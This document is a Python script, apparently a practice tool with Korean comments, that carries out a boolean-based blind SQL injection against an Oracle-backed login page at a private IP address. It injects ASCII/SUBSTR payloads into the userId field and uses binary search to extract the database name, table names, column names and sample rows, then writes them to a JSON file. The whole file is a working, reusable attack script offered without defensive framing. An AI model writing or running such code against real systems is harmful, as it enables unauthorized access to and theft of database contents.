import requests
import json

# 기본 설정
url = "http://192.168.8.128:8080/Website/login/loginOk.lo"
headers = {
    "User-Agent": "Mozilla/5.0",
    "Content-Type": "application/x-www-form-urlencoded",
    "Cookie": "JSESSIONID=EXAMPLE"  # ← 실제 로그인 세션값으로
}
constant_param = {"userPw": "dummy"}
paramName = "userId"
failure_text = "-1"
payload_template = "' OR ASCII(SUBSTR(({}), {}, 1)) {} {} AND '1'='1' -- "

def is_true(payload):
    data = constant_param.copy()
    data[paramName] = payload
    r = requests.post(url, data=data, headers=headers)
    return r.text.strip() != failure_text

def extract_string(query):
    result = ""
    for i in range(1, 30):
        low, high = 32, 126
        while low + 1 < high:
            mid = (low + high) // 2
            payload = payload_template.format(query, i, ">", mid)
            if is_true(payload):
                low = mid
            else:
                high = mid
        char = chr(high)
        if char == "!" or not char.isprintable():
            break
        result += char
        print(f"[CHAR {i}] => {char} | {result}")
    return result

def get_multiple(query_template, label, limit=5):
    results = []
    for i in range(1, limit + 1):
        print(f"\n[+] {label.upper()} {i} 추출 중...")
        query = query_template.format(i)
        value = extract_string(query)
        if not value:
            break
        results.append(value)
        print(f"[+] {label} {i}: {value}")
    return results

# 결과 저장 구조
result_json = {
    "database": "",
    "tables": {}
}

# (1) DB 이름 추출
print("\n[★] 현재 DB 이름 추출")
db_name = extract_string("SELECT SYS_CONTEXT('USERENV','DB_NAME') FROM dual")
result_json["database"] = db_name

# (2) 테이블 목록 추출
print("\n[★] 테이블 목록 추출")
table_query = "SELECT table_name FROM (SELECT table_name, ROWNUM r FROM user_tables WHERE ROWNUM <= 100) WHERE r={}"
tables = get_multiple(table_query, "table", limit=3)

# (3) 각 테이블의 컬럼 및 데이터 추출
for table in tables:
    print(f"\n[★] '{table}' 테이블의 컬럼 추출")
    result_json["tables"][table] = {
        "columns": [],
        "data": []
    }

    # 컬럼 목록
    col_query = f"SELECT column_name FROM (SELECT column_name, ROWNUM r FROM user_tab_columns WHERE table_name='{table}') WHERE r={{}}"
    columns = get_multiple(col_query, f"{table}_column", limit=3)
    result_json["tables"][table]["columns"] = columns

    # row 데이터 (각 column 별로 3개씩 추출)
    for i in range(1, 4):  # rownum = 1~3
        row_entry = {}
        for col in columns:
            data_query = f"SELECT TO_CHAR({col}) FROM (SELECT {col}, ROWNUM r FROM {table}) WHERE r={i}"
            data_value = extract_string(data_query)
            row_entry[col] = data_value
        if any(row_entry.values()):
            result_json["tables"][table]["data"].append(row_entry)

# (4) 최종 JSON 출력
print("\n\n[★] 최종 JSON 결과:")
print(json.dumps(result_json, indent=2, ensure_ascii=False))

# (5) JSON 파일로 저장
with open("blind_extracted_result.json", "w", encoding="utf-8") as f:
    json.dump(result_json, f, indent=2, ensure_ascii=False)

print("[+] 결과가 'blind_extracted_result.json' 파일에 저장되었습니다.")